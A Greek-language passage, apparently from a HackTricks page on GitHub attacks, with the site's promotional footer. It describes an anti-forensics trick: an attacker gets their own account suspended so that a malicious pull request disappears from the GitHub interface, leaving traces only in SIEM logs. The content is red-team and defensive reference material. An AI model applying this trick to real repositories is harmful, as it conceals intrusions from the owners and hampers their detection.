Μια οργάνωση στο GitHub είναι πολύ προορατική στο να αναφέρει λογαριασμούς στο GitHub. Το μόνο που χρειάζεται να κάνετε είναι να μοιραστείτε "κάποια πράγματα" στο θέμα και θα διασφαλίσουν ότι ο λογαριασμός σας θα τεθεί σε αναστολή σε 12 ώρες :p και έτσι έχετε κάνει την εκμετάλλευσή σας αόρατη στο github.

{% hint style="warning" %}
Ο μόνος τρόπος για μια οργάνωση να καταλάβει ότι έχει γίνει στόχος είναι να ελέγξει τα αρχεία καταγραφής του GitHub από το SIEM, αφού από το UI του GitHub η PR θα έχει αφαιρεθεί.
{% endhint %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
